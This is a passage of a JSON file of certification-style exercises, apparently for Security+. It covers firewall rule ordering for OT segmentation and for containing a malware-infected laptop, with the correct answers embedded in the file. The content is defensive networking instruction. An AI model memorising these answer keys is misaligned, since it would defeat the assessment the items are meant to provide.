                  "text": "10.80.20.15/32"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "rdp",
                  "text": "TCP 3389"
                },
                {
                  "id": "modbus",
                  "text": "TCP 502"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "src": "office",
            "svc": "any"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the three rules. The firewall reads from the top, stops at the first match, and drops anything that matches nothing.",
        "explanation": "Engineering exception, OT block, office allow. The engineering workstation is part of 10.80.0.0/16, so its RDP session also matches the block, and the exception has to come first. The block has to sit above the office allow, which also matches traffic into the OT network. Traffic that OT devices start matches none of the three rules, so the firewall drops it.",
        "payload": {
          "items": [
            {
              "id": "office",
              "label": "Allow office users everything else"
            },
            {
              "id": "eng",
              "label": "Allow the engineering workstation to reach the HMI over RDP"
            },
            {
              "id": "noOt",
              "label": "Block the office network from the OT network"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "eng",
            "noOt",
            "office"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "A month on, the live table reads as follows, top rule first. Which rule can never fire?",
        "explanation": "Rule 3 never fires. Rule 2 lets the whole office reach Any, and the OT network is part of Any, so every office connection into the plant is allowed before rule 3 is read. Any infected office PC can now reach the PLCs and the HMI, which is the IT-to-OT path ransomware needs to stop a plant. Rule 1 still fires for the engineering workstation. Fix: move rule 3 above rule 2.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Allow · Engineering WS → HMI · RDP"
            },
            {
              "id": "l2",
              "text": "2 · Allow · Office network → Any · any service"
            },
            {
              "id": "l3",
              "text": "3 · Deny · Office network → OT network · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l3"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-10",
    "cert": "secplus",
    "objective": "4.5",
    "topic": "Host containment",
    "title": "Contain an infected laptop at the firewall",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "The SOC has confirmed malware on a sales laptop at 10.90.40.66 in the user VLAN (10.90.40.0/24). The access switch has already cut the laptop off from its neighbours on the VLAN, because that traffic never passes through the firewall. The core firewall routes between the VLANs and out to the internet, and until the responders finish, the laptop has to be contained there. The ticket: the rest of the user VLAN works normally; the laptop may not open connections to anything outside the user VLAN; the one exception is its EDR agent, which reaches the EDR console at 10.90.9.15 in the security VLAN (10.90.9.0/24) over HTTPS, so responders keep live telemetry and can pull files and memory remotely. The firewall reads top-down, stops at the first match, and drops anything no rule matches.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Sales floor · FW-CORE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "lap",
            "label": "Infected laptop",
            "type": "pc",
            "zone": "users",
            "ip": "10.90.40.66",
            "x": 0,
            "y": 0,
            "state": "compromised"
          },
          {
            "id": "users",
            "label": "User VLAN",
            "type": "pc",
            "zone": "users",
            "ip": "10.90.40.0/24",
            "x": 0,
            "y": 1
          },
          {
            "id": "fw",
            "label": "FW-CORE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "edr",
            "label": "EDR console",
            "type": "server",
            "zone": "security",
            "ip": "10.90.9.15",
            "x": 4,
            "y": 0
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "ip": "any",
            "x": 4,
            "y": 1
          },
          {
            "id": "fs",
            "label": "File server",
            "type": "server",
            "zone": "servers",
            "ip": "10.90.20.10",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "lap",
            "to": "fw"
          },
          {
            "from": "users",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "edr"
          },
          {
            "from": "fw",
            "to": "net"
          },
          {
            "from": "fw",
            "to": "fs"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "edr",
          "action": "allow",
          "proto": "tcp",
          "src": "10.90.40.66/32",
          "dst": "10.90.9.15/32",
          "port": 443
        },
        {
          "id": "contain",
          "action": "deny",
          "proto": "any",
          "src": "10.90.40.66/32",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "users",
          "action": "allow",
          "proto": "any",
          "src": "10.90.40.0/24",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "edr agent checks in",
          "proto": "tcp",
          "src": "10.90.40.66",
          "dst": "10.90.9.15",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "laptop to the file server blocked",
          "proto": "tcp",
          "src": "10.90.40.66",
          "dst": "10.90.20.10",
          "port": 445,
          "expect": "deny"
        },
        {
          "name": "laptop to the internet blocked",
          "proto": "tcp",
          "src": "10.90.40.66",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "deny"
        },
        {
          "name": "colleague browses the web",
          "proto": "tcp",
          "src": "10.90.40.12",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "colleague opens the file server",
          "proto": "tcp",
          "src": "10.90.40.12",
          "dst": "10.90.20.10",
          "port": 445,
          "expect": "allow"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "contain",
            "action": "deny",
            "proto": "any",
            "src": "10.90.40.66/32",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "edr",
            "action": "allow",
            "proto": "tcp",
            "src": "10.90.40.66/32",
            "dst": "10.90.9.15/32",
            "port": 443
          },
          {
            "id": "users",
            "action": "allow",
            "proto": "any",
            "src": "10.90.40.0/24",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "edr"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the containment rule.",
        "explanation": "Deny the laptop’s /32 to any destination on any service. Blocking the /24 would take the whole sales floor offline. Blocking only SMB (445) still leaves HTTPS open for command-and-control and data theft, and blocking only 443 leaves SMB open for spreading.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "vlan",
                  "text": "10.90.40.0/24"
                },
                {
                  "id": "lap",
                  "text": "10.90.40.66/32"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "smb",
                  "text": "TCP 445"
                },
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "https",
                  "text": "TCP 443"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "src": "lap",
            "svc": "any"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the EDR exception.",
        "explanation": "Allow the laptop to the EDR console’s /32 on TCP 443, the channel its agent uses. Opening the whole security VLAN would give an infected machine a path to every security tool, the systems an attacker most wants to tamper with. RDP (3389) or SSH (22) would open an interactive login path to the console instead of the agent channel.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "sec",
                  "text": "10.90.9.0/24"
                },
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "edr",
                  "text": "10.90.9.15/32"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "rdp",
                  "text": "TCP 3389"
                },
                {
                  "id": "https",
                  "text": "TCP 443"
                },
                {
                  "id": "ssh",
                  "text": "TCP 22"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "dst": "edr",
            "svc": "https"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the three rules. The firewall reads from the top, stops at the first match, and drops anything that matches nothing.",
        "explanation": "EDR exception, containment block, user-VLAN allow. The console is part of any, so the agent’s traffic also matches the block, and the exception has to sit above it. The block has to sit above the user-VLAN allow, because the laptop is part of 10.90.40.0/24 and would otherwise keep full access. The firewall drops anything unmatched by itself.",
        "payload": {
          "items": [
            {
              "id": "users",
              "label": "Allow the rest of the user VLAN its normal access"
            },
            {
              "id": "contain",
              "label": "Block every other connection from the laptop"
            },
            {
              "id": "edr",
              "label": "Allow the laptop’s EDR agent to reach its console"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "edr",
            "contain",
            "users"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "The responder who made the change pastes the live table, top rule first. Which rule can never fire?",
        "explanation": "Rule 2 never fires. The EDR console is part of Any, so the agent’s check-ins hit rule 1’s deny first. The laptop is contained, but it also drops off the EDR console, and responders lose the live telemetry and remote collection they were counting on. Rule 3 still fires for every other laptop on the VLAN. Fix: move rule 2 above rule 1.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Deny · Infected laptop → Any · any service"
            },
            {
              "id": "l2",
              "text": "2 · Allow · Infected laptop → EDR console · HTTPS"
            },
            {
              "id": "l3",
              "text": "3 · Allow · User VLAN → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l2"
          ]
        }
      }
    ]
  }
];
